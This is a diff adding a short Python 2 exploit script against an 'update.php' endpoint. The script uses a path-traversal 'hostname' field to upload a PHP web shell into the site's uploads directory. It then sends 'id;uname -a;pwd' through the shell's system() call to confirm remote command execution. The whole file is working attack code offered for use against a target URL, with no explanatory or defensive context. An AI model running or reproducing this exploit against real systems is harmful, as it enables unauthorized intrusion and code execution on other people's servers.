@@ -1,0 +1,35 @@
+#!/usr/bin/python
+# coding: utf-8
+import requests
+import sys
+requests.packages.urllib3.disable_warnings()
+
+def pwn(update_url):
+    data = {"id": "1337", "action": "download", "secondary": "lol", "hostname": "../../../../../var/www/html/uploads/lol"}
+    files = {'download': open('shell.php','rb')}
+    print "{+} Uploading Shell..."
+    try:
+        r = requests.post(url=update_url, files=files, data=data, verify=False)
+    except Exception, e:
+        sys.exit(str(e))
+    shell_url = update_url.replace("update.php", "uploads/lol/shell.php")
+    print "{+} Shell Uploaded. It should be at %s" %(shell_url)
+    return shell_url
+
+def check_shell(shell_url):
+    print "{+} Sending id;uname -a;pwd...\n\n"
+    data = {"1337": 'system("id;uname -a;pwd");'}
+    try:
+        r = requests.post(shell_url, data=data, verify=False)
+        print r.content
+    except Exception, e:
+        sys.exit(str(e))
+
+def main(args):
+    if len(args) !=2:
+        sys.exit("use: %s https://target.tld/update.php" %(args[0]))
+    shell_url = pwn(update_url=args[1])
+    check_shell(shell_url)
+
+if __name__ == "__main__":
+    main(args=sys.argv)
